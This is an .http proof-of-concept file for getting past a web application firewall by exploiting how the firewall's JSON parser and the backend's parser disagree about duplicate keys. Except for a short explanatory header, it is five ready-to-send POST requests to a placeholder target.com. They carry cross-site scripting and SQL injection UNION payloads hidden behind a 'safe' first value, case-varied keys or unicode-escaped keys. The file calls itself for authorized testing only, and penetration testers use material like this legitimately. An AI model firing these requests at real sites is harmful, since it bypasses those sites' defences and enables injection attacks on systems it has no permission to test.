###
# ============================================================================
# Safe PoC -> x8bitranjit
# JSON duplicate-key parser-differential WAF bypass (.http format).
# Authorized testing only. WHAT TO EDIT: target.com + the endpoint.
#
# WHY IT WORKS: the WAF's JSON parser and the app's parser disagree on
# duplicate keys - WAF validates the FIRST value ("safe"), the backend takes
# the LAST (Go/Node/PHP/Python json all take last). The payload never
# touches a byte the WAF scanned. (WAFBypass kit FILTER-132.)
# ============================================================================

### 1) dup-key baseline (WAF sees "safe", app gets the payload)
POST https://target.com/api/comment HTTP/1.1
Host: target.com
Content-Type: application/json

{"comment":"safe","comment":"<img src=x onerror=alert(document.domain)>"}

### 2) dup-key SQLi variant
POST https://target.com/api/search HTTP/1.1
Host: target.com
Content-Type: application/json

{"id":"1","id":"1' UNION SELECT version()-- -"}

### 3) case-duplication (case-insensitive stacks: "Comment" vs "comment")
POST https://target.com/api/comment HTTP/1.1
Host: target.com
Content-Type: application/json

{"Comment":"safe","comment":"<img src=x onerror=alert(document.domain)>"}

### 4) unicode-escaped key + plain key (same normalized name)
POST https://target.com/api/comment HTTP/1.1
Host: target.com
Content-Type: application/json

{"\u0063omment":"safe","comment":"<img src=x onerror=alert(document.domain)>"}

### 5) verify which value the APP saw (echo endpoint first)
POST https://target.com/api/echo HTTP/1.1
Host: target.com
Content-Type: application/json

{"comment":"safe","comment":"app-parser-proof"}
